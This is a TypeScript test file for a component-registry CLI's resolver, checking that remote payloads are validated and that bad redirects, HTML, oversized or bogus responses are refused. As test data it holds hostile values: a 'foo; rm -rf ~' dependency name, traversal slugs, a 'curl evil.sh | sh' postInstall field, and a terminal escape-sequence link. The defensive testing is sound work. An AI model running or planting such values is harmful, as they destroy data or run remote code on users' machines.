// Guards that harden the registry trust boundary: schema validation of
// remote payloads, refused cross-origin redirects, HTML/non-JSON rejection,
// dependency/slug constraints, and the non-default-host override warning.

import assert from "node:assert/strict";
import { test, beforeEach, afterEach } from "node:test";

import {
  fetchComponent,
  fetchFeatureMarkdown,
  resolveIndexEntry,
  resolveIndexEntryWithSnapshot,
  resolveComponentTree,
  registryOverrideWarning,
} from "../src/cli/resolver.js";
import { REGISTRY_BASE_URL } from "../src/cli/_registry.generated.js";

const TEST_ORIGIN = "https://registry.test";

interface ResSpec {
  status?: number;
  url?: string;
  contentType?: string;
  contentLength?: number;
  location?: string;
  json?: unknown;
  jsonThrows?: boolean;
  text?: string;
}

function makeRes(reqUrl: string, spec: ResSpec): Response {
  const status = spec.status ?? 200;
  const headers = new Headers();
  if (spec.contentType) headers.set("content-type", spec.contentType);
  if (spec.contentLength !== undefined) {
    headers.set("content-length", String(spec.contentLength));
  }
  if (spec.location) headers.set("location", spec.location);
  const body = spec.jsonThrows
    ? "{invalid"
    : spec.text ?? (spec.json === undefined ? "" : JSON.stringify(spec.json));
  const response = new Response(body, { status, headers });
  Object.defineProperty(response, "url", { value: spec.url ?? reqUrl });
  return response;
}

function stubFetch(spec: ResSpec | ResSpec[]): string[] {
  const requests: string[] = [];
  const specs = Array.isArray(spec) ? [...spec] : [spec];
  globalThis.fetch = (async (input: unknown) => {
    const url =
      typeof input === "string" ? input : (input as { url: string }).url;
    requests.push(url);
    const next = specs.shift();
    if (!next) throw new Error(`Unexpected request: ${url}`);
    return makeRes(url, next);
  }) as typeof fetch;
  return requests;
}

const validPayload = {
  name: "dialog",
  type: "registry:ui",
  title: "Dialog",
  description: "A dialog.",
  dependencies: ["clsx", "@astrojs/react"],
  registryDependencies: ["cn"],
  files: [{ path: "components/ui/dialog/Dialog.astro", content: "hi" }],
};

let originalFetch: typeof globalThis.fetch;
let originalEnv: string | undefined;

beforeEach(() => {
  originalFetch = globalThis.fetch;
  originalEnv = process.env.NIMBUS_REGISTRY_URL;
  process.env.NIMBUS_REGISTRY_URL = TEST_ORIGIN;
});

afterEach(() => {
  globalThis.fetch = originalFetch;
  if (originalEnv === undefined) delete process.env.NIMBUS_REGISTRY_URL;
  else process.env.NIMBUS_REGISTRY_URL = originalEnv;
});

// ---- Schema validation ----------------------------------------------------

test("valid payload parses to a typed ComponentItem", async () => {
  stubFetch({ contentType: "application/json", json: validPayload });
  const item = await fetchComponent("dialog");
  assert.equal(item.name, "dialog");
  assert.deepEqual(item.dependencies, ["clsx", "@astrojs/react"]);
});

test("component payload name must agree with the requested slug", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, name: "button" },
  });
  await assert.rejects(fetchComponent("dialog"), /does not match requested slug/);
});

test("component payload type must agree with its index entry", async () => {
  stubFetch({ contentType: "application/json", json: validPayload });
  await assert.rejects(
    fetchComponent("dialog", {
      name: "dialog",
      type: "registry:lib",
      title: "Dialog",
      description: "A dialog.",
    }),
    /does not match index type/,
  );
});

test("exact dependency versions pass payload validation", async () => {
  const dependencies = [
    "@scalar/openapi-parser@0.28.12",
    "openapi-sampler@1.7.4",
    "@readme/httpsnippet@11.4.0",
  ];
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, dependencies },
  });
  const item = await fetchComponent("dialog");
  assert.deepEqual(item.dependencies, dependencies);
});

test("payload missing files[] is rejected before use", async () => {
  const { files, ...noFiles } = validPayload;
  void files;
  stubFetch({ contentType: "application/json", json: noFiles });
  await assert.rejects(fetchComponent("dialog"), /failed validation/);
});

test("non-string dependency is rejected", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, dependencies: [123] },
  });
  await assert.rejects(fetchComponent("dialog"), /failed validation/);
});

test("shell-shaped dependency name is rejected", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, dependencies: ["foo; rm -rf ~"] },
  });
  await assert.rejects(fetchComponent("dialog"), /valid npm package name/);
});

test("traversal-shaped dependency name is rejected", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, dependencies: ["../evil"] },
  });
  await assert.rejects(fetchComponent("dialog"), /valid npm package name/);
});

test("unknown fields are stripped, not rejected (forward-compat + inert)", async () => {
  // Unknown keys strip so the wire format can grow; the dangerous known fields
  // stay constrained (see the dep/slug tests above).
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, version: "0.9.0", postInstall: "curl evil.sh | sh" },
  });
  const item = await fetchComponent("dialog");
  assert.equal(item.name, "dialog");
  assert.equal(item.version, "0.9.0"); // known additive field is kept
  assert.equal(
    (item as Record<string, unknown>).postInstall,
    undefined, // unknown field stripped, not carried through
  );
});

test("traversal-shaped registry slug is rejected", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, registryDependencies: ["../../evil"] },
  });
  await assert.rejects(fetchComponent("dialog"), /valid registry slug/);
});

test("remote display fields reject terminal control characters", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, title: "Dialog\u001b]8;;https://evil.test\u0007click" },
  });
  await assert.rejects(fetchComponent("dialog"), /failed validation/);
});

test("transitive components must exist in the registry index", async () => {
  stubFetch([
    {
      contentType: "application/json",
      json: { ...validPayload, registryDependencies: ["not-indexed"] },
    },
    {
      contentType: "application/json",
      json: { version: 1, registryVersion: "next", items: {} },
    },
  ]);
  await assert.rejects(
    resolveComponentTree("dialog", {
      name: "dialog",
      type: "registry:ui",
      title: "Dialog",
      description: "A dialog.",
    }),
    /Unknown registry item/,
  );
});

test("components cannot depend on registry features", async () => {
  stubFetch([
    {
      contentType: "application/json",
      json: { ...validPayload, registryDependencies: ["agent-guide"] },
    },
    {
      contentType: "application/json",
      json: {
        version: 1,
        registryVersion: "next",
        items: {
          "agent-guide": {
            name: "agent-guide",
            type: "registry:feature",
            title: "Agent guide",
            description: "Instructions.",
          },
        },
      },
    },
  ]);
  await assert.rejects(
    resolveComponentTree("dialog", {
      name: "dialog",
      type: "registry:ui",
      title: "Dialog",
      description: "A dialog.",
    }),
    /cannot depend on feature/,
  );
});

test("a component tree uses one consistent live index snapshot", async () => {
  const requests = stubFetch([
    {
      contentType: "application/json",
      json: {
        version: 1,
        registryVersion: "next",
        items: {
          "new-dialog": {
            name: "new-dialog",
            type: "registry:ui",
            title: "Dialog",
            description: "A dialog.",
          },
          "dep-a": {
            name: "dep-a",
            type: "registry:lib",
            title: "Dependency A",
            description: "First dependency.",
          },
          "dep-b": {
            name: "dep-b",
            type: "registry:lib",
            title: "Dependency B",
            description: "Second dependency.",
          },
        },
      },
    },
    {
      contentType: "application/json",
      json: {
        ...validPayload,
        name: "new-dialog",
        registryDependencies: ["dep-a", "dep-b"],
      },
    },
    {
      contentType: "application/json",
      json: {
        ...validPayload,
        name: "dep-a",
        type: "registry:lib",
        registryDependencies: [],
      },
    },
    {
      contentType: "application/json",
      json: {
        ...validPayload,
        name: "dep-b",
        type: "registry:lib",
        registryDependencies: [],
      },
    },
  ]);
  const resolved = await resolveIndexEntryWithSnapshot("new-dialog");
  const items = await resolveComponentTree(
    "new-dialog",
    resolved.entry,
    resolved.liveIndex,
  );
  assert.deepEqual(items.map((item) => item.name), ["dep-a", "dep-b", "new-dialog"]);
  assert.equal(
    requests.filter((url) => url.endsWith("/registry.json")).length,
    1,
  );
});

// ---- Transport guards -----------------------------------------------------

test("bundled index hits remain offline", async () => {
  let calls = 0;
  globalThis.fetch = (async () => {
    calls += 1;
    throw new Error("must stay offline");
  }) as typeof fetch;
  const entry = await resolveIndexEntry("dialog");
  assert.equal(entry.name, "dialog");
  assert.equal(calls, 0);
});

test("invalid requested slugs are rejected before lookup or fetch", async () => {
  let calls = 0;
  globalThis.fetch = (async () => {
    calls += 1;
    throw new Error("must not fetch");
  }) as typeof fetch;
  await assert.rejects(resolveIndexEntry("__proto__"), /Invalid registry item/);
  await assert.rejects(resolveIndexEntry("../dialog"), /Invalid registry item/);
  assert.equal(calls, 0);
});

test("a bundled miss resolves from a valid live index", async () => {
  const requests = stubFetch({
    contentType: "application/json",
    json: {
      version: 1,
      registryVersion: "next",
      items: {
        "new-feature": {
          name: "new-feature",
          type: "registry:feature",
          title: "New feature",
          description: "Newly published.",
        },
      },
    },
  });
  const entry = await resolveIndexEntry("new-feature");
  assert.equal(entry.type, "registry:feature");
  assert.deepEqual(requests, [`${TEST_ORIGIN}/registry.json`]);
});

test("live index rejects key/name disagreement", async () => {
  stubFetch({
    contentType: "application/json",
    json: {
      version: 1,
      registryVersion: "next",
      items: {
        "new-feature": {
          name: "other-feature",
          type: "registry:feature",
          title: "New feature",
          description: "Newly published.",
        },
      },
    },
  });
  await assert.rejects(resolveIndexEntry("new-feature"), /must match its key/);
});

test("unknown item after a successful live index fetch is actionable", async () => {
  stubFetch({
    contentType: "application/json",
    json: { version: 1, registryVersion: "next", items: {} },
  });
  await assert.rejects(
    resolveIndexEntry("not-published"),
    /checked successfully; verify the spelling/,
  );
});

test("cross-origin redirect is refused", async () => {
  stubFetch({
    contentType: "application/json",
    json: validPayload,
    url: "https://evil.test/components/dialog.json",
  });
  await assert.rejects(fetchComponent("dialog"), /redirected across origins/);
});

test("same-origin redirect (e.g. trailing slash / path change) is allowed", async () => {
  stubFetch({
    contentType: "application/json",
    json: validPayload,
    url: `${TEST_ORIGIN}/components/dialog.json/`,
  });
  const item = await fetchComponent("dialog");
  assert.equal(item.name, "dialog");
});

test("same-origin redirects are followed manually", async () => {
  const requests = stubFetch([
    { status: 302, location: "/moved/dialog.json" },
    { contentType: "application/json", json: validPayload },
  ]);
  const item = await fetchComponent("dialog");
  assert.equal(item.name, "dialog");
  assert.deepEqual(requests, [
    `${TEST_ORIGIN}/components/dialog.json`,
    `${TEST_ORIGIN}/moved/dialog.json`,
  ]);
});

test("more than five redirects are refused", async () => {
  stubFetch(
    Array.from({ length: 6 }, (_, index) => ({
      status: 302,
      location: `/redirect-${index + 1}`,
    })),
  );
  await assert.rejects(fetchComponent("dialog"), /limit of 5 redirects/);
});

test("HTML response for a component fetch fails cleanly", async () => {
  stubFetch({ contentType: "text/html", text: "<!doctype html>" });
  await assert.rejects(fetchComponent("dialog"), /returned HTML/);
});

test("invalid JSON body fails with a pointable error", async () => {
  stubFetch({ contentType: "application/json", jsonThrows: true });
  await assert.rejects(fetchComponent("dialog"), /not valid JSON/);
});

test("feature fetch rejects HTML instead of emitting it as markdown", async () => {
  stubFetch({ contentType: "text/html", text: "<!doctype html>" });
  await assert.rejects(
    fetchFeatureMarkdown("404-page"),
    /returned HTML/,
  );
});

test("feature fetch returns markdown on a clean response", async () => {
  stubFetch({ contentType: "text/markdown", text: "# Hello\n" });
  const md = await fetchFeatureMarkdown("404-page");
  assert.equal(md, "# Hello\n");
});

test("content-length is rejected before reading oversized responses", async () => {
  stubFetch({
    contentType: "text/markdown",
    contentLength: 2 * 1024 * 1024 + 1,
    text: "small body",
  });
  await assert.rejects(fetchFeatureMarkdown("404-page"), /Content-Length/);
});

test("streamed response size is bounded after decompression", async () => {
  stubFetch({
    contentType: "application/json",
    text: "x".repeat(1024 * 1024 + 1),
  });
  await assert.rejects(resolveIndexEntry("new-feature"), /byte size limit/);
});

for (const [status, expected] of [
  [401, /access was denied \(401\)/],
  [403, /access was denied \(403\)/],
  [404, /not found \(404\)/],
  [429, /rate limit exceeded \(429\)/],
  [503, /server is unavailable \(503\)/],
] as const) {
  test(`HTTP ${status} is classified`, async () => {
    stubFetch({ status });
    await assert.rejects(fetchComponent("dialog"), expected);
  });
}

test("nested proxy CONNECT failures retain their actionable cause", async () => {
  globalThis.fetch = (async () => {
    throw new TypeError("fetch failed", {
      cause: new Error("proxy CONNECT tunnel refused"),
    });
  }) as typeof fetch;
  await assert.rejects(
    fetchComponent("dialog"),
    /Proxy\/connection error: fetch failed -> proxy CONNECT tunnel refused/,
  );
});

test("timeouts are classified separately from transport failures", async () => {
  globalThis.fetch = (async () => {
    throw new DOMException("The operation timed out", "TimeoutError");
  }) as typeof fetch;
  await assert.rejects(fetchComponent("dialog"), /timed out after 10 seconds/);
});

// ---- Override warning (pure) ----------------------------------------------

test("registryOverrideWarning names a non-default host", () => {
  process.env.NIMBUS_REGISTRY_URL = "https://example.com";
  const msg = registryOverrideWarning();
  assert.ok(msg);
  assert.match(msg!, /example\.com/);
  assert.match(msg!, /NIMBUS_REGISTRY_URL/);
});

test("registryOverrideWarning is silent for the default host", () => {
  process.env.NIMBUS_REGISTRY_URL = REGISTRY_BASE_URL;
  assert.equal(registryOverrideWarning(), null);
});

test("registryOverrideWarning is silent when unset", () => {
  delete process.env.NIMBUS_REGISTRY_URL;
  assert.equal(registryOverrideWarning(), null);
});
